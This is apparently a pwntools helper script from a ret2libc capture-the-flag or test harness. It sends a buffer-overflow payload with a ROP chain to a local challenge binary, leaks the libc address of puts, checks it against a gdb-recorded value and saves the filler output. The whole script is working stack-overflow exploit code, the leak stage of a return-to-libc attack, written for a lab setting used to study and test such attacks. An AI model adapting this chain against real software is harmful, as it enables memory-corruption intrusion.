from pwn import *

import time

target = process("./chall-test_ret2libc-4-x64")
gdb.attach(target, gdbscript="get_libc_puts_address")

payload = ""
payload += "000000000000000000000000000000000000000000000000000000000000000000000000"
payload += p64(0x401203)
payload += p64(0x404018)
payload += p64(0x401050)
target.sendline(payload)
foundEnd = False
output = ""
while foundEnd == False:
    try:
        output += target.recvline()
    except:
        foundEnd = True
time.sleep(1)
putsFile = open("noodles", "r")
putsAddress = putsFile.read()
putsFile.close()
putsAddress = int(putsAddress, 16)
outputLines = output.split("\n")
leakLine = outputLines[-2]
workingLeakLine = leakLine.strip("\n")
lineLength = 8
if len(workingLeakLine) < 8:
    lineLength = len(workingLeakLine)
hexValues = []
for i in range(1, lineLength + 1):
    currentLeak = str(workingLeakLine[-i:])
    currentAddress = u64(currentLeak + "\x00"*(8-len(currentLeak)))
    if currentAddress == putsAddress:
        savedIndex = i
        break
finalFillerOutput = leakLine[:-savedIndex]
fillerOutput = outputLines[:-2]
fillerOutput.append(finalFillerOutput)
fillerOutput = "\n".join(fillerOutput)
outputFile = open("noop", "w")
outputFile.write(fillerOutput)
outputFile.close()

